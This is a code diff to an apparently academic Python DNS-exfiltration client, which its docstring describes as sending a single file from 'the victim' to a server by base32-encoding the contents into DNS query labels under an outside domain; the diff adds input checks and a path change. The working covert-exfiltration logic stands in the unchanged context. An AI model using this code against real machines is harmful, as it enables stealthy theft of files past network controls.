@@ -1,4 +1,6 @@
 import base64
+import os
+from pathlib import Path
 
 import dns.resolver
 
@@ -6,7 +8,7 @@ import dns.resolver
 class Client:
     """
     The Client class deals with the client side (the victim)
-    when it sends a single file from the victim
+    by sending a single file from the victim
     to the server via DNS messages
     """
 
@@ -16,6 +18,7 @@ class Client:
         :param label_len: the max len between periods
         :param record_len: the total len of one dns record
         """
+        self.check_params(path, label_len, record_len)
         self.path = path
         self.message = self.get_message()
         self.label_len = label_len
@@ -31,7 +34,6 @@ class Client:
         b = '.'.join([b[i:i + self.label_len] for i in range(0, len(b), self.label_len)])
         b = b + '.'
 
-        # enc_mes='.'.join([mes[i:i + 2] for i in range(0, len(mes), 2)])
         return b
 
     def get_message(self):
@@ -56,8 +58,17 @@ class Client:
             msg = self.encode_to_base32(pkt)
             answers = dns.resolver.query(f'www.{msg}jct.ac.il', 'A')
 
+    @staticmethod
+    def check_params(path, label_len, record_len):
+        if not os.path.isfile(path):
+            raise FileNotFoundError(f'The given path {path} is incorrect')
+        if not isinstance(label_len, int):
+            raise TypeError(f'the label length must be an integer. you gave {type(label_len)}')
+        if not isinstance(record_len, int):
+            raise TypeError(f'the record length must be an integer. you gave {type(record_len)}')
+
 
 if __name__ == '__main__':
-    tool = Client(r"C:\Users\מתניה\Functions_For_Project\Text.txt", 5, 15)
-
+    path = str(Path(__file__).parent.parent)+'\\Text.txt'
+    tool = Client(path=path, label_len=5, record_len=15)
     tool.send_messages()
